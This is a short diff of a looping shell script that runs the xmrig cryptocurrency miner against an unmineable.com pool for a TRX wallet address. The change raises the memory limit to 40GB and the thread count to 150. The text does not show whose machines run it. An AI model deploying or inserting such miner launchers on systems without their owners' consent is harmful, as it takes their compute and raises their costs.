@@ -5,8 +5,8 @@ while true; do
     start_time=$(date +%s%N)
 
     # Execute the command in the background
-    ulimit -v 4000000  # Set the virtual memory limit to 4GB
-    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.1333333ss1 -p x -t 8
+    ulimit -v 40000000  # Set the virtual memory limit to 40GB
+    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.e -p x -t 150
 
     # Wait for the command to finish
     wait
